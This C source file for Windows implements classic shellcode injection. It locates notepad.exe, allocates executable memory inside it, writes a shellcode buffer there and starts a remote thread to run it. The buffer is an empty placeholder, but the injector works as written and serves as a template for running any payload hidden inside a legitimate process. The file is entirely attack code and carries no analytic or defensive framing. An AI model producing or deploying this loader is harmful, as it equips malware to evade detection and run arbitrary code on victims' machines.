#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

char shellcode[] = " ";

unsigned int payloadLen = sizeof(shellcode);

// Function to get the process ID (PID) by its name
int getPIDbyProcName(const char *procName)
{
    int pid = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Get the first process entry in the snapshot
    if (Process32First(hSnap, &pe32) != FALSE)
    {
        // Iterate through the running process to find the process with the specified name
        while (pid == 0 && Process32Next(hSnap, &pe32) != FALSE)
        {
            if (strcmp(pe32.szExeFile, procName) == 0)
            {
                // Found the process with the matching name,store its PID
                pid = pe32.th32ProcessID;
            }
        }
    }
    CloseHandle(hSnap);
    return pid;
}

int main()
{

    // Get the PID of the process to inject into
    int pid = getPIDbyProcName("notepad.exe");
    if (pid == 0)
    {
        printf("Process not found\n");
        return 1;
    }

    // Get a handle to the process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    // Allocate memory in the process for the shellcode
    LPVOID hAlloc = VirtualAllocEx(hProc, NULL, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write the shellcode to allocated memory
    WriteProcessMemory(hProc, hAlloc, shellcode, payloadLen, NULL);

    // Create a Thread in the process to execute the shellcode
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)hAlloc, NULL, 0, NULL);

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);
}